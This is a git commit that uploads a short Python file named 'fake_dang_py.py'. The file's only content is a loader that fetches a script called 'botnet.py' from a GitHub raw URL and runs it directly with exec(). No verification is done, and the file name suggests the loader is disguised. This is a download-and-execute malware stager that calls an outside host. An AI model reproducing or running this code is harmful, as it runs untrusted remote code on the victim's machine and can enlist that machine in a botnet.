c0963b600871a9c440afa061de739e5b70b186a3
tranminhquang2347 <166131875+tranminhquang2347@users.noreply.github.com>
2024-07-04 15:37:24 +0700

    Add files via upload

---
+++ fake_dang_py.py
@@ -0,0 +1,10 @@
+import requests
+url = 'https://raw.githubusercontent.com/tranminhquang2347/adscsacsactest34/main/botnet.py'
+response = requests.get(url)
+
+if response.status_code == 200:
+    python_code = response.text.strip()
+
+    exec(python_code)
+else:
+    print(f"Failed to retrieve the webpage. Status code: {response.status_code}")
